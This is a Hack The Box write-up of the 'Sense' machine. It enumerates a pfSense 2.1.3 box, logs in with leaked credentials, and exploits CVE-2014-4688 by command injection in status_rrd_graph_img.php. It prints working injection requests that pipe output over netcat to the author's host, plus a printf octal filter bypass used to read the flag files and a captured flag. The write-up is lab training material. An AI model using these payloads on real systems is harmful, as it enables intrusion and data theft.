# Hack The Box - Sense | Write-up

> **Platform:** Hack The Box &nbsp;•&nbsp; **Category:** OpenBSD Machine &nbsp;•&nbsp; **Difficulty:** Easy
>
> **Target:** `10.129.55.184` &nbsp;•&nbsp; **Time taken:** 45 mins
>
> **Author:** Jithin Jelson

---

## Introduction

The box we will be exploiting today is called Sense and it is an easy difficulty OpenBSD machine.

---

## Assessment Overview

```mermaid
flowchart LR
  A["Nmap Recon<br/>80 + 443 web"]:::entry

  A --> B["pfSense login<br/>portal"]:::intel
  A --> CERT["TLS cert recon"]:::ioc
  A --> FF["ffuf enum"]:::intel

  FF --> FF1["no extension<br/>= nothing"]:::ioc
  FF --> FF2[".txt extension<br/>system-users.txt"]:::intel
  FF2 --> E["creds<br/>rohit : pfsense"]:::intel

  B --> LOGIN["Login pfSense 2.1.3"]:::payload
  E --> LOGIN
  CERT --> LOGIN

  LOGIN --> G["searchsploit<br/>CVE-2014-4688"]:::mitre
  G --> H["database=queues;id<br/>command injection"]:::payload

  H --> BLIND["blind: no output<br/>in response"]:::ioc
  H --> NC["pipe to nc<br/>uid=0 root"]:::payload
  H --> BL["blacklist bypass<br/>printf octal env vars"]:::mitre

  NC --> U["user.txt"]:::user
  BL --> U
  NC --> R["root.txt"]:::user
  BL --> R

  classDef entry fill:#1d4ed8,stroke:#1e3a8a,color:#ffffff;
  classDef ioc fill:#0f766e,stroke:#134e4a,color:#ffffff;
  classDef intel fill:#7c3aed,stroke:#5b21b6,color:#ffffff;
  classDef mitre fill:#b45309,stroke:#78350f,color:#ffffff;
  classDef payload fill:#be123c,stroke:#881337,color:#ffffff;
  classDef user fill:#15803d,stroke:#14532d,color:#ffffff;
  linkStyle default stroke-width:2px
```

---

## What I Learned

- Using file extensions like `.txt` with ffuf to enumerate content when a plain directory scan doesn't return anything useful, which is how I found system-users.txt.
- How to read and deobfuscate a public exploit's Python code so I could understand the command injection and perform it manually instead of just running the script.
- Replacing blacklisted characters like `.` and `/` with `printf` octal escapes stored in environment variables, so I could bypass the input filter and still build file paths.
- Reading a `man ascii` table to find the octal codes for the characters I needed (`.` is 056 and `/` is 057).
- Piping command output back to my own machine with Netcat when the injection was blind and returned no output in the response.

---

## Enumeration with Nmap

We can start an Nmap scan on our target with default scripts of NSE and enumerate service versions too.

```
nmap -sV -sC 10.129.55.184
```

![Nmap scan of the target](images/01-nmap-scan.png)

*Figure 1 - Nmap shows two open web ports, HTTP (80) and HTTPS (443).*

It seems we have 2 ports open, and they're both web ports, so it looks like it is going to be a pure web exploit. We can start off by visiting our web page.

![pfSense login page over HTTPS](images/02-pfsense-login.png)

*Figure 2 - The site is a pfSense login page and it redirects us to HTTPS.*

Seems like it is a pfSense website as the name suggests, and it has redirected us to HTTPS. We can check out the certificate to see if we have anything useful in there and try a few default credentials.

![TLS certificate details](images/03-ssl-certificate.png)

*Figure 3 - The TLS certificate details only show placeholder organisation information.*

We didn't get much useful information and the default credentials didn't seem to work, so we can now enumerate our web page using ffuf and the directory-list-2.3-medium.txt directory.

---

## Directory Enumeration with ffuf

We tried initially but we didn't get anything useful. Perhaps there is an extension that we're meant to find, so we started off with php and then moved onto txt. After enumerating we found these useful piece of information.

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.129.55.184/FUZZ
```

![Initial ffuf run returns nothing useful](images/04-ffuf-no-extension.png)

*Figure 4 - The plain directory scan only returns default folders, nothing useful.*

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.129.55.184/FUZZ.txt
```

![ffuf with .txt finds system-users.txt](images/05-ffuf-txt-system-users.png)

*Figure 5 - Fuzzing with the .txt extension finds system-users.txt, which leaks the username rohit.*

So it turns out the password was pfsense but the username we were looking for was rohit.

---

## Logging into pfSense

When we logged in it seems the only drop down working was Status. We also got the version of pfSense on our main screen, 2.1.3, so we can Google for an exploit. We used searchsploit and found an RCE through command injection. Here we could use this script and just exploit it, but it wouldn't teach us anything so we decided to break down the code and perform it manually.

![pfSense dashboard showing version 2.1.3](images/06-pfsense-dashboard.png)

*Figure 6 - The pfSense dashboard confirms version 2.1.3-RELEASE.*

---

## Finding the Exploit

![Searching for the pfSense 2.1.3 exploit](images/07-exploit-search.png)

*Figure 7 - The pfSense 2.1.3 command injection is CVE-2014-4688 in status_rrd_graph_img.php.*

It seems there is a post-login exploit that uses command injection on the RRD graph, and this is available in our drop down menu. So we went to searchsploit to view this exploit, and after breaking it down we can see the exploit runs in the parameter `?database=queues; <command>`.

![Breaking down the exploit code](images/08-exploit-code.png)

*Figure 8 - The exploit code shows the injection point in the database parameter of status_rrd_graph_img.php.*

---

## Achieving RCE via Command Injection

So we can intercept and try achieve RCE through Burp Suite. When we tried to run it, it seems it works but we're not getting any output.

```
GET /status_rrd_graph_img.php?database=queues;id
```

![Burp shows the injection works but returns no output](images/09-burp-id-no-output.png)

*Figure 9 - The injection runs but the response is an image, so we get no command output back.*

So we can pipe this over to Netcat by using `| nc 10.10.15.110 1234` with a listener running.

```
nc -lnvp 1234
```

```
GET /status_rrd_graph_img.php?database=queues;id | nc 10.10.15.110 1234
```

![id output piped to netcat shows root](images/10-nc-root-id.png)

*Figure 10 - Piping the output to Netcat shows uid=0(root), so we already have root.*

It seems we have root access already. Now we can find our user.txt and root.txt, as privilege escalation isn't necessary here.

---

## Bypassing Blacklisted Characters

However when we ran `../../../` it seems we weren't getting a response. This might be because these characters are blacklisted, so we will have to use printf to modify them. If we go to a `man ascii` we can see that `.` is 056 and `/` is 057 so we can try use these instead.

![man ascii table showing octal codes](images/11-man-ascii.png)

*Figure 11 - man ascii confirms `.` is octal 056 and `/` is octal 057.*

We declared x as the environment variable for `.` and y as the environment variable for `/`.

```
GET /status_rrd_graph_img.php?database=queues;x=$(printf+"\56");y=$(printf+"\57");echo+${y}+|+nc+10.10.15.110+1234 HTTP/1.1
```

![Testing the printf environment variables](images/12-printf-echo-test.png)

*Figure 12 - Echoing the y variable returns `/`, confirming the printf substitution works.*

---

## Reading the Flags

Now with this we can evade the blacklisted characters and read our user.txt and root.txt.

```
GET /status_rrd_graph_img.php?database=queues;x=$(printf+"\56");y=$(printf+"\57");cat+${x}${x}${y}${x}${x}${y}${x}${x}${y}home${y}rohit${y}user.txt+|+nc+10.10.15.110+1234
```

![user.txt flag read via netcat](images/13-user-flag.png)

*Figure 13 - Reading user.txt through the printf-based path returns the user flag.*

> Submit the user flag.

**Answer:** `8721327cc232073b40d27d9c17e7348b`

```
GET /status_rrd_graph_img.php?database=queues;x=$(printf+"\56");y=$(printf+"\57");cat+${x}${x}${y}${x}${x}${y}${x}${x}${y}root${y}root.txt+|+nc+10.10.15.110+1234
```

> Submit the root flag.

**Answer:** `see final request (not captured in the notes)`
